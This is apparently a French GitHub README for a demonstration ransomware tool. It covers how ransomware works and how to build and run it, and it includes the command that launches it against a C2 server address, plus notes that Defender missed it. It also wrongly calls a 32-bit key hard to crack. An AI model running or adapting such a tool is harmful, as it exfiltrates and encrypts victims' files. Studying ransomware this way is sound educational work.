# RamsRat-Ransomware
Un faux Ransomware pour comprendre exactement comment il fonctionne.

**DISCLAIMER   : Je ne suis pas responsable de tout ce que vous faites avec ce script. Je mets à disposition ce script et mes pseudos connaissances dans l'unique but d'instruire et non pas détruire.**

English-Version

Pour comprendre comment fonctionne un ransomware, il est important de noter que ce qui suit est une description générale. Les ransomware peuvent varier considérablement en fonction des spécificités de chaque virus.

En général, un ransomware :

- Est exécuté par l'hôte ou l'attaquant sur la machine cible.
- Crée une clé (souvent de 32 bits, ce qui peut prendre beaucoup de temps à casser).
- Envoie les fichiers à un serveur de commande et contrôle (C2).
- Crypte les fichiers avec la clé.
- Demande une rançon.

## Ransomware

Un ransomware est un script, un logiciel qui exécute du code pour chiffrer l'intégralité des données personnelles. Il peut ou non extraire ces données vers un serveur distant, afin que, même si vous payez la rançon, les attaquants puissent toujours les utiliser.

Ensuite, il vous est demandé de payer en échange de la clé de décryptage (et parfois d'un déchiffreur).

La finalité de l'histoire dépend uniquement de la bonne foi de la personne qui a chiffré votre ordinateur (lol).

## ServeurC2

Un serveur C2 (commande et contrôle) sert principalement à gérer les victimes de vos payloads, un peu comme les sessions dans Metasploit.

Ici, il s'agit simplement d'un script Python qui permet de recevoir des fichiers via un lien.


## Prérequis Build

- Un client Windows (vous pouvez utiliser votre propre Windows, le script est inoffensif, ou utiliser une machine virtuelle).
- Visual Studio Community
  
## Prérequis Started

- Un client Windows (vous pouvez utiliser votre propre Windows, le script est inoffensif, ou utiliser une machine virtuelle).
- Python 3 (sur Windows ou Linux, peu importe).
- .NET.

## Fonctionnement


**<!> Chiffre uniquement les fichiers du Bureau, pas de dossiers ou d'autres emplacements.**

- Exécution par l'utilisateur.
- Copie les fichiers du Bureau vers : `Bureau/DecryptFiles`.
- Envoie les fichiers du Bureau vers le serveur C2.
- Change le fond d'écran.
- Exécute un `readme.txt`.
- Chiffre les fichiers du Bureau avec une clé de 32 bits.

À la fin, on se retrouve avec un Bureau complètement chiffré.

Les fichiers copiés sont dans `Bureau/DecryptFiles`.

Les fichiers sur le serveur de contrôle (C2) sont décryptés et bien téléchargés.

Étant une démonstration, aucune persistance ni corruption de données ne sera effectuée.

Enfin, un déchiffreur `Decryptor.exe` et la clé de 32 bits vous seront nécessaires si vous voulez déchiffrer les données sur le Bureau.

**Encore une fois, il y a une copie de ces données dans `Bureau/DecryptFiles`, ce qui ne vous oblige en aucun cas à déchiffrer les fichiers du Bureau. Vous pouvez simplement les copier.**



## Get Started

Comme cité plus tôt, ce script est théoriquement inoffensif. Néanmoins, il peut être aisément modifié pour causer des dommages. N'utilisez que le script provenant de CE GITHUB.

Le serveur C2 est indépendant du ransomware. Il peut être distant ou local, peu importe, sur une autre machine ou sur la machine qui va être chiffrée.

### Installation du serveur C2

- Installation des dépendances :
  - Windows : 
    - Python3
    ```
    pip install Flask
    ```
  - Linux
    ```
    sudo apt install python3
    pip install Flask
    ```

- Lancez le serveur c2. **(Si c'est sur le windows ne mettez pas le script sur le bureau)**

  ![plot](./img/serverc2.png)

### Execution du Ransomware

Defender ?

![plot](./img/defenderanalyse.gif)


Defender se fait avoir surement car on vient de la build, néanmois, je suis déçu qu'il ne detecte même pas l'encryption de fichier sur votre pc.

- Après avoir build ou téléchargé la release, on se retrouve avec un dossier `Ramsom`.
- On le place n'importe ou sur la machine qu'on veut "chifrée".

- On lance un cmd pour préciser le serveurC2 et le port. Tapez `cmd` en haut de la barre d'adresse.
  ![plot](./img/cmdexec.png)


- Enfin on execute la commande 
    ``RamsRat.exe ip-server-c2 port-server-c2`` == 
    ``RamsRat.exe 10.0.24.55 5000``

- A la fin de l'éxecution : 
  - Le bureau est chiffré et le fond d'écran changé :
  
    ![plot](./img/Execution.gif)

  - Le readme s'est ouvert avec des instructions (Fake):
  
    ![plot](./img/encryptdesk.png)

  - Les fichiers ont été envoyés au C2 et sont lisibles : 

    ![plot](./img/filesc2.png)

  

- On retrouve quand meme nos fichiers copiés dans `Bureau/DecryptFiles`. Ainsi que la clef de decryptage :

    ![plot](./img/decryptfiles.png)

  
### Decryption des fichiers

Avec le Ransomware je fournis le Decryptor.exe.

On lui fournis le path du dossier encrypter ainsi que la clef. Ici c'est simple les deux sont dans le bureau.

Il faut l'utiliser avec cmd et la commande.


```
Decryptor.exe <encryptedFolderPath> <keyFilePath>

Decryptor.exe C:\Users\ratus\Desktop C:\Users\ratus\Desktop\DESKTOP-S3D0A9K.encryptionkey.key
```

![plot](./img/decryption.gif)


### Nettoyage 

- Avec decryptor : 
  - Décrypter vos données
  - Supprimer tout les fichiers .ratus
  - Supprimer le dossier `DecryptFiles`
  - Supprimer le readme
  - Supprimer le projet (optionnel)
- Sans decryptor :
  - Copier les fichiers de `DecryptFiles` sur le Bureau
  - Supprimer les .ratus
  - Supprimer le readme
  - Supprimer `DecryptFiles`
  - Supprimer le projet (optionnel)
- Serveurc2 :
  - Supprimer le script python
  - `pip unistall Flask`
